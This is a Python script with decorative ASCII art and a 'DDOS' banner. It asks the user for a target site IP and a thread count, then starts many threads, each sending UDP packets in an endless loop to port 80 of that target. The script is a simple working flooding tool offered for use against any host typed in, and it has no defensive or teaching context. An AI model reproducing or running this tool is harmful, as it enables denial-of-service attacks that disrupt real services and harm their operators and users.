from random import choice, randint
import time
from time import sleep
import socket
import _thread
import sys
import os
from colorama import Fore, Back
	
try:
	import rainbowtext, pyfiglet
except:
	os.system ("pip install rainbowtext")
	os.system ("pip install pyfiglet")

os.system ("clear")

print (rainbowtext.text(pyfiglet.figlet_format("DDOS")))
print (f"\t{Fore.GREEN} [*]{Fore.WHITE} Create by :{Fore.RED} BarDia shovaliye")
foni = f"""{Fore.MAGENTA}
  ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀  ⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷      ⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀  
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆  
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿         {Fore.CYAN} aQaBarDia {Fore.MAGENTA}
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟  
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀  
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃  ⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀  
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀  
 ⠀⠀⠀⠀ ⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁       
"""

for c in foni:
    sys.stdout.write(c)
    sys.stdout.flush()
    sleep(0.03)
    


site = input(Fore.RED+f"\t{Fore.YELLOW}[+]Enter your site IP=>{Fore.CYAN} ")
x = (Fore.BLUE+f'''
                  .----.
      .---------. | == |
      |.-"""""-.| |----|
      ||       || | == |
      ||       || |----|
      |'-.....-'| |::::|
      "")---("" |___.|
     /:::::::::::\" _  "
    /:::=======:::\\\
jps"""""""""""""  '-'
''')
for c in x:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.03)
thread_count = int(input(f"{Fore.RED}       [+]Enter your thread/=> \033[35m"))
   
print (f"\n\033[92m >")
sleep(0.5)
print (f"\n >>")
sleep(0.5)
print ("\n >>>")
sleep(0.5)
print ("\n >>>>")
sleep(0.5)
print ("\n >>>>>")
sleep(0.5)
print ("\n >>>>>>")
sleep(0.5)
print ("\n >>>>>>>")
sleep(0.5)
print ("\n >>>>>>>>")
sleep(0.5)
print ("\n >>>>>>>>>")
sleep(0.5)
print ("\n >>>>>>>>>>")
print (Fore.RED+"\n\t Lest Go.....!")
sleep(0.5)


t = time.localtime(time.time())
localtime = time.asctime(t)
hh = " Started : " + time.asctime(t)

print(hh);

sleep(1)
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'please Ban veblag do sexi works'
print("UDP target IP:",ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(Fore.RED+"[*]Packet Sent The"+" "+Fore.YELLOW+site,thread_count)
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" +str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass